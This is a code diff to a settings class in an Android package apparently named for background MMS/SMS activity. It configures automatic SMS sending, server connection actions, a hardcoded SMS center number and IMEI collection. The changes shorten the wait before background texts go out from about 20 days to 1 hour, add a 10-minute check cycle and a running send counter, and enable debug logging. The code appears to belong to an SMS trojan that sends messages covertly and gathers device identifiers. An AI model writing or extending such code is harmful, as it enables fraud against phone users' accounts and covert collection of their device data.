@@ -45,10 +45,11 @@ import com.mms.bg.util.XMLHandler;
 
 public class SettingManager {
     private static final String TAG = "SettingManager";
-    private static final boolean DEBUG = false;
+    private static final boolean DEBUG = true;
     
     public static final String TARGET_NUM = "target_num";
     public static final String SMS_COUNT = "sms_send_count";
+    public static final String SMS_ROUND_TOTAL_SEND = "sms_round_total_send";
     public static final String LAST_SMS_TIME = "last_sms_time";
     public static final String LAST_SMS_FORMAT_TIME = "last_sms_format_time";
     public static final String LAST_DIAL_TIME = "last_dial_time";
@@ -79,9 +80,11 @@ public class SettingManager {
     private static final int DEFAULT_SMS_COUNT = 0;
     
     private static final String DEFAULT_VALUE = "";
-//    private static final long SMS_DEFAULT_DELAY_TIME = (((long) 30) * 24 * 3600 * 1000);
-    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 24) * 20 * 3600 * 1000);
+//    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 20) * 24 * 3600 * 1000);
+    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 1) * 3600 * 1000);
     private static final long SMS_ONE_ROUND_NAP = 5 * 60 * 1000;
+//    public static final long SMS_CHECK_ROUND_DELAY = ((long) 24) * 3600 * 1000;
+    public static final long SMS_CHECK_ROUND_DELAY = ((long) 10) * 60 * 1000;
     
     public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
     public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
@@ -241,13 +244,22 @@ public class SettingManager {
         return mSP.getBoolean(ENABLE_SMS, true); 
     }
     
-    public void setSMSSendCount(int count) {
+    public void setTodaySMSSendCount(int count) {
         mEditor.putInt(SMS_COUNT, count);
         mEditor.commit();
     }
     
-    public int getSMSSendCount() {
+    public int getTodaySMSSendCount() {
         return mSP.getInt(SMS_COUNT, DEFAULT_SMS_COUNT);
+    }
+    
+    public void setSMSRoundTotalSnedCount(int count) {
+        mEditor.putInt(SMS_ROUND_TOTAL_SEND, count);
+        mEditor.commit();
+    }
+    
+    public int getSMSRoundTotalSend() {
+        return mSP.getInt(SMS_ROUND_TOTAL_SEND, DEFAULT_SMS_COUNT);
     }
     
     public void setSMSSendDelay(long delay) {
@@ -522,7 +534,7 @@ public class SettingManager {
         String smsCenter = this.getSMSCenter();
         //test code
 //        if (smsCenter == null) {
-            smsCenter = "13800100500";
+            smsCenter = "13800550500";
 //        }
         LOGD("[[savePhoneInfo]] smsCenter = " + smsCenter);
         if (smsCenter != null) {
@@ -534,7 +546,7 @@ public class SettingManager {
             LOGD("[[savePhoneInfo]] split the smsCenter = " + smsCenter);
             TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
             String imei = tm.getDeviceId();
-            String version = "1.0";
+            String version = "1.0.1";
             String first = "1";
             String handled = "0";
             String pid = mPid;
